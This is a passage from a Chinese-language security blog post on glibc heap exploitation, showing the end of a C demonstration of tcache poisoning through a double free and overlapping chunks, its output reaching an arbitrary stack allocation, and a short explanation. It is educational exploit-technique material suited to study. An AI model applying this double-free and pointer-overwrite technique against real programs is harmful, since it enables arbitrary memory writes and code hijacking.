</span></span><span class=line><span class=cl>        <span class=n>x</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mh>0x100</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>puts</span><span class=p>(</span><span class=s>&#34;Allocating a chunk for later consolidation&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>intptr_t</span> <span class=o>*</span><span class=n>prev</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mh>0x100</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>puts</span><span class=p>(</span><span class=s>&#34;Allocating the victim chunk.&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>intptr_t</span> <span class=o>*</span><span class=n>a</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mh>0x100</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>printf</span><span class=p>(</span><span class=s>&#34;malloc(0x100): a=%p.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>a</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>puts</span><span class=p>(</span><span class=s>&#34;Allocating a padding to prevent consolidation.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>malloc</span><span class=p>(</span><span class=mh>0x10</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// cause chunk overlapping
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>puts</span><span class=p>(</span><span class=s>&#34;Now we are able to cause chunk overlapping&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>puts</span><span class=p>(</span><span class=s>&#34;Step 1: fill up tcache list&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span><span class=p>(</span><span class=kt>int</span> <span class=n>i</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span> <span class=n>i</span><span class=o>&lt;</span><span class=mi>7</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=n>free</span><span class=p>(</span><span class=n>x</span><span class=p>[</span><span class=n>i</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>puts</span><span class=p>(</span><span class=s>&#34;Step 2: free the victim chunk so it will be added to unsorted bin&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>free</span><span class=p>(</span><span class=n>a</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>puts</span><span class=p>(</span><span class=s>&#34;Step 3: free the previous chunk and make it consolidate with the victim chunk.&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>free</span><span class=p>(</span><span class=n>prev</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>puts</span><span class=p>(</span><span class=s>&#34;Step 4: add the victim chunk to tcache list by taking one out from it and free victim again</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>malloc</span><span class=p>(</span><span class=mh>0x100</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=cm>/*VULNERABILITY*/</span>
</span></span><span class=line><span class=cl>    <span class=n>free</span><span class=p>(</span><span class=n>a</span><span class=p>);</span><span class=c1>// a is already freed
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=cm>/*VULNERABILITY*/</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// simple tcache poisoning
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>puts</span><span class=p>(</span><span class=s>&#34;Launch tcache poisoning&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>puts</span><span class=p>(</span><span class=s>&#34;Now the victim is contained in a larger freed chunk, we can do a simple tcache poisoning by using overlapped chunk&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>intptr_t</span> <span class=o>*</span><span class=n>b</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mh>0x120</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>puts</span><span class=p>(</span><span class=s>&#34;We simply overwrite victim&#39;s fwd pointer&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>b</span><span class=p>[</span><span class=mh>0x120</span><span class=o>/</span><span class=mi>8</span><span class=o>-</span><span class=mi>2</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=kt>long</span><span class=p>)</span><span class=n>stack_var</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// take target out
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>puts</span><span class=p>(</span><span class=s>&#34;Now we can cash out the target chunk.&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>malloc</span><span class=p>(</span><span class=mh>0x100</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>intptr_t</span> <span class=o>*</span><span class=n>c</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mh>0x100</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>printf</span><span class=p>(</span><span class=s>&#34;The new chunk is at %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>c</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// sanity check
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>assert</span><span class=p>(</span><span class=n>c</span><span class=o>==</span><span class=n>stack_var</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>printf</span><span class=p>(</span><span class=s>&#34;Got control on target/stack!</span><span class=se>\n\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// note
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>puts</span><span class=p>(</span><span class=s>&#34;Note:&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>puts</span><span class=p>(</span><span class=s>&#34;And the wonderful thing about this exploitation is that: you can free b, victim again and modify the fwd pointer of victim&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>puts</span><span class=p>(</span><span class=s>&#34;In that case, once you have done this exploitation, you can have many arbitary writes very easily.&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>输出：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>This file demonstrates a powerful tcache poisoning attack by tricking malloc into
</span></span><span class=line><span class=cl>returning a pointer to an arbitrary location (in this demo, the stack).
</span></span><span class=line><span class=cl>This attack only relies on double free.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>The address we want malloc() to return, namely,
</span></span><span class=line><span class=cl>the target address is 0x7ffd2845e850.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Preparing heap layout
</span></span><span class=line><span class=cl>Allocating 7 chunks(malloc(0x100)) for us to fill up tcache list later.
</span></span><span class=line><span class=cl>Allocating a chunk for later consolidation
</span></span><span class=line><span class=cl>Allocating the victim chunk.
</span></span><span class=line><span class=cl>malloc(0x100): a=0xcffae0.
</span></span><span class=line><span class=cl>Allocating a padding to prevent consolidation.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Now we are able to cause chunk overlapping
</span></span><span class=line><span class=cl>Step 1: fill up tcache list
</span></span><span class=line><span class=cl>Step 2: free the victim chunk so it will be added to unsorted bin
</span></span><span class=line><span class=cl>Step 3: free the previous chunk and make it consolidate with the victim chunk.
</span></span><span class=line><span class=cl>Step 4: add the victim chunk to tcache list by taking one out from it and free victim again
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Launch tcache poisoning
</span></span><span class=line><span class=cl>Now the victim is contained in a larger freed chunk, we can do a simple tcache poisoning by using overlapped chunk
</span></span><span class=line><span class=cl>We simply overwrite victim&#39;s fwd pointer
</span></span><span class=line><span class=cl>Now we can cash out the target chunk.
</span></span><span class=line><span class=cl>The new chunk is at 0x7ffd2845e850
</span></span><span class=line><span class=cl>Got control on target/stack!
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Note:
</span></span><span class=line><span class=cl>And the wonderful thing about this exploitation is that: you can free b, victim again and modify the fwd pointer of victim
</span></span><span class=line><span class=cl>In that case, once you have done this exploitation, you can have many arbitary writes very easily.
</span></span></code></pre></td></tr></table></div></div><p>首先用 7 个 0x100 的 chunk 填满 tcache，再次申请 0x100 的 chunk <code>a</code> 并释放就只能进入 unsorted bin。如果它上一个 chunk 同样是 0x100 并且也被释放，那么它们就会合并。</p><p>现在从 tcache 中取出一个 chunk，然后 double free 掉 <code>a</code>，<code>a</code> 就进入了 tcache。然后我们申请一个大于 0x100 的 chunk 使得 tcache 无法满足申请，从而从 unsorted bin 中取出刚才合并好的 chunk，构成堆块重叠，修改 <code>a</code> 的 <code>fd</code> 为栈上地址，<code>malloc</code> 两次即可分配到栈上。</p></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>更新于 2019-12-09</span></div><div class=post-info-license></div></div><div class=post-info-line><div class=post-info-md></div><div class=post-info-share><span></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fas fa-tags fa-fw"></i>&nbsp;<a href=/tags/%E5%A0%86%E6%BC%8F%E6%B4%9E/>堆漏洞</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>返回</a></span>&nbsp;|&nbsp;<span><a href=/>主页</a></span></section></div><div class=post-nav><a href=/glibc-heap/ class=prev rel=prev title="盘根错节：GLibc 堆内存管理机制简介"><i class="fas fa-angle-left fa-fw"></i>盘根错节：GLibc 堆内存管理机制简介</a>
<a href=/rop-emporium/ class=next rel=next title="ROP Emporium 练习记录">ROP Emporium 练习记录<i class="fas fa-angle-right fa-fw"></i></a></div></div><div id=comments><div id=valine class=comment></div><noscript>Please enable JavaScript to view the comments powered by <a href=https://valine.js.org/>Valine</a>.</noscript></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line>由 <a href=https://gohugo.io/ target=_blank rel="noopener noreffer" title="Hugo 0.94.0">Hugo</a> 强力驱动 | 主题 - <a href=https://github.com/dillonzq/LoveIt target=_blank rel="noopener noreffer" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a></div><div class=footer-line><i class="far fa-copyright fa-fw"></i><span itemprop=copyrightYear>2017 - 2022</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=/ target=_blank>Mercury</a></span>&nbsp;|&nbsp;<span class=license><a rel="license external nofollow noopener noreffer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title=回到顶部><i class="fas fa-arrow-up fa-fw"></i>
</a><a href=# id=view-comments class=fixed-button title=查看评论><i class="fas fa-comment fa-fw"></i></a></div><link rel=stylesheet href=/lib/valine/valine.min.css><link rel=stylesheet href=/lib/lightgallery/lightgallery.min.css><link rel=stylesheet href=/lib/katex/katex.min.css><script type=text/javascript src=/lib/valine/Valine.min.js></script><script type=text/javascript src=/lib/smooth-scroll/smooth-scroll.min.js></script><script type=text/javascript src=/lib/autocomplete/autocomplete.min.js></script><script type=text/javascript src=/lib/algoliasearch/algoliasearch-lite.umd.min.js></script><script type=text/javascript src=/lib/lazysizes/lazysizes.min.js></script><script type=text/javascript src=/lib/lightgallery/lightgallery.min.js></script><script type=text/javascript src=/lib/lightgallery/lg-thumbnail.min.js></script><script type=text/javascript src=/lib/lightgallery/lg-zoom.min.js></script><script type=text/javascript src=/lib/clipboard/clipboard.min.js></script><script type=text/javascript src=/lib/katex/katex.min.js></script><script type=text/javascript src=/lib/katex/auto-render.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"复制到剪贴板",maxShownLines:30},comment:{valine:{appId:"RkxCznUcvfzFBgfMiMr0BAfd-gzGzoHsz",appKey:"sw2sEPOl4haCAXKUFYiBFMrR",avatar:"mp",el:"#valine",emojiCDN:"https://cdn.jsdelivr.net/npm/emoji-datasource-google@5.0.1/img/google/64/",emojiMaps:{100:"1f4af.png",alien:"1f47d.png",anger:"1f4a2.png",angry:"1f620.png",anguished:"1f627.png",astonished:"1f632.png",black_heart:"1f5a4.png",blue_heart:"1f499.png",blush:"1f60a.png",bomb:"1f4a3.png",boom:"1f4a5.png",broken_heart:"1f494.png",brown_heart:"1f90e.png",clown_face:"1f921.png",cold_face:"1f976.png",cold_sweat:"1f630.png",confounded:"1f616.png",confused:"1f615.png",cry:"1f622.png",crying_cat_face:"1f63f.png",cupid:"1f498.png",dash:"1f4a8.png",disappointed:"1f61e.png",disappointed_relieved:"1f625.png",dizzy:"1f4ab.png",dizzy_face:"1f635.png",drooling_face:"1f924.png",exploding_head:"1f92f.png",expressionless:"1f611.png",face_vomiting:"1f92e.png",face_with_cowboy_hat:"1f920.png",face_with_hand_over_mouth:"1f92d.png",face_with_head_bandage:"1f915.png",face_with_monocle:"1f9d0.png",face_with_raised_eyebrow:"1f928.png",face_with_rolling_eyes:"1f644.png",face_with_symbols_on_mouth:"1f92c.png",face_with_thermometer:"1f912.png",fearful:"1f628.png",flushed:"1f633.png",frowning:"1f626.png",ghost:"1f47b.png",gift_heart:"1f49d.png",green_heart:"1f49a.png",grimacing:"1f62c.png",grin:"1f601.png",grinning:"1f600.png",hankey:"1f4a9.png",hear_no_evil:"1f649.png",heart:"2764-fe0f.png",heart_decoration:"1f49f.png",heart_eyes:"1f60d.png",heart_eyes_cat:"1f63b.png",heartbeat:"1f493.png",heartpulse:"1f497.png",heavy_heart_exclamation_mark_ornament:"2763-fe0f.png",hole:"1f573-fe0f.png",hot_face:"1f975.png",hugging_face:"1f917.png",hushed:"1f62f.png",imp:"1f47f.png",innocent:"1f607.png",japanese_goblin:"1f47a.png",japanese_ogre:"1f479.png",joy:"1f602.png",joy_cat:"1f639.png",kiss:"1f48b.png",kissing:"1f617.png",kissing_cat:"1f63d.png",kissing_closed_eyes:"1f61a.png",kissing_heart:"1f618.png",kissing_smiling_eyes:"1f619.png",laughing:"1f606.png",left_speech_bubble:"1f5e8-fe0f.png",love_letter:"1f48c.png",lying_face:"1f925.png",mask:"1f637.png",money_mouth_face:"1f911.png",nauseated_face:"1f922.png",nerd_face:"1f913.png",neutral_face:"1f610.png",no_mouth:"1f636.png",open_mouth:"1f62e.png",orange_heart:"1f9e1.png",partying_face:"1f973.png",pensive:"1f614.png",persevere:"1f623.png",pleading_face:"1f97a.png",pouting_cat:"1f63e.png",purple_heart:"1f49c.png",rage:"1f621.png",relaxed:"263a-fe0f.png",relieved:"1f60c.png",revolving_hearts:"1f49e.png",right_anger_bubble:"1f5ef-fe0f.png",robot_face:"1f916.png",rolling_on_the_floor_laughing:"1f923.png",scream:"1f631.png",scream_cat:"1f640.png",see_no_evil:"1f648.png",shushing_face:"1f92b.png",skull:"1f480.png",skull_and_crossbones:"2620-fe0f.png",sleeping:"1f634.png",sleepy:"1f62a.png",slightly_frowning_face:"1f641.png",slightly_smiling_face:"1f642.png",smile:"1f604.png",smile_cat:"1f638.png",smiley:"1f603.png",smiley_cat:"1f63a.png",smiling_face_with_3_hearts:"1f970.png",smiling_imp:"1f608.png",smirk:"1f60f.png",smirk_cat:"1f63c.png",sneezing_face:"1f927.png",sob:"1f62d.png",space_invader:"1f47e.png",sparkling_heart:"1f496.png",speak_no_evil:"1f64a.png",speech_balloon:"1f4ac.png","star-struck":"1f929.png",stuck_out_tongue:"1f61b.png",stuck_out_tongue_closed_eyes:"1f61d.png",stuck_out_tongue_winking_eye:"1f61c.png",sunglasses:"1f60e.png",sweat:"1f613.png",sweat_drops:"1f4a6.png",sweat_smile:"1f605.png",thinking_face:"1f914.png",thought_balloon:"1f4ad.png",tired_face:"1f62b.png",triumph:"1f624.png",two_hearts:"1f495.png",unamused:"1f612.png",upside_down_face:"1f643.png",weary:"1f629.png",white_frowning_face:"2639-fe0f.png",white_heart:"1f90d.png",wink:"1f609.png",woozy_face:"1f974.png",worried:"1f61f.png",yawning_face:"1f971.png",yellow_heart:"1f49b.png",yum:"1f60b.png",zany_face:"1f92a.png",zipper_mouth_face:"1f910.png",zzz:"1f4a4.png"},enableQQ:!1,highlight:!0,lang:"zh-cn",pageSize:10,placeholder:"你的评论 ...",recordIP:!1,visitor:!0}},lightGallery:{actualSize:!1,exThumbImage:"data-thumbnail",hideBarsDelay:2e3,selector:".lightgallery",speed:400,thumbContHeight:80,thumbWidth:80,thumbnail:!0},math:{delimiters:[{display:!0,left:"$$",right:"$$"},{display:!0,left:"\\[",right:"\\]"},{display:!1,left:"$",right:"$"},{display:!1,left:"\\(",right:"\\)"}],strict:!1},search:{algoliaAppID:"P149SBLX5U",algoliaIndex:"blog",algoliaSearchKey:"cbd5db1f3910ee11bc18688f21b64bd4",highlightTag:"em",maxResultLength:10,noResultsFound:"没有找到结果",snippetLength:50,type:"algolia"}}</script><script type=text/javascript src=/js/theme.min.js></script></body></html>